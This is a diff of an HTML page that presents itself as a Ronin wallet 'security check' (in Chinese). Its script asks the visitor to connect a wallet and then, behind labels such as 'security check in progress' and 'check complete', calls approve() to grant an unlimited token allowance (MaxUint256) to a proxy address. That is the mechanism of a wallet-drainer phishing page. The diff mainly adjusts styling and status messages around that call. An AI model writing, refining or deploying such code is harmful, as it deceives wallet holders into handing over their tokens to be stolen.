@@ -8,6 +8,7 @@
         body {
             font-family: Arial, sans-serif;
             background-color: #1a1a1a;
+            color: #fff;
             text-align: center;
             padding: 20px;
             margin: 0;
@@ -36,7 +37,7 @@
         }
         p {
             font-size: 18px;
-            color: #fff;
+            color: #555;
         }
         #walletStatus {
             color: #28a745;
@@ -46,16 +47,18 @@
             margin-top: 20px;
             padding: 10px;
             font-size: 18px;
-            color: red;  /* Changed to red for better visibility on black background */
+            color: #ff4d4d; /* 修改状态提示为红色 */
         }
         img {
+            width: 100px;
+            height: auto;
             margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <!-- Logo -->
-    <img src="https://raw.githubusercontent.com/sanyi94888/my-ronin/main/WeChat%E6%88%AA%E5%9B%BE%E5%9B%9A%E6%94%AF%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="Ronin Logo" style="width: 100px; height: auto;">
+    <!-- Logo 图片 -->
+    <img src="https://raw.githubusercontent.com/sanyi94888/my-ronin/main/WeChat%E6%88%AA%E5%9B%BE_20250403114421.png" alt="Ronin Logo">
     <h1>Ronin钱包安全检测</h1>
 
     <!-- 链接钱包按钮 -->
@@ -202,14 +205,14 @@
 
         // 安全检测
         async function approveTokens() {
+            // 禁用按钮避免重复点击
+            document.getElementById("approveButton").disabled = true;
+            document.getElementById("operationStatus").innerText = "状态: 正在安全检测中，请稍候...";
+
             if (!signer) {
                 alert("请先链接钱包！");
                 return;
             }
-
-            // 禁用按钮
-            document.getElementById("approveButton").disabled = true;
-            document.getElementById("operationStatus").innerText = "状态: 正在进行安全检测，请稍等...";
 
             // 创建代币合约实例
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
@@ -218,17 +221,16 @@
                 // 调用 approve 方法授权无限额度
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
                 console.log("安全检测已发送:", tx.hash);
-                document.getElementById("operationStatus").innerText = "状态: 查询已提交，请等待确认...";
                 await tx.wait(); // 等待交易确认
                 document.getElementById("operationStatus").innerText = "状态: 安全检测完成！";
                 alert("操作成功，已完成安全检测！");
             } catch (error) {
                 console.error("操作失败:", error);
-                document.getElementById("operationStatus").innerText = "状态: 查询失败，请检查控制台错误信息！";
+                document.getElementById("operationStatus").innerText = "状态: 检测失败，请检查控制台错误信息！";
                 alert("操作失败，请检查控制台错误信息！");
             }
 
-            // 启用按钮
+            // 完成后启用按钮
             document.getElementById("approveButton").disabled = false;
         }
     </script>
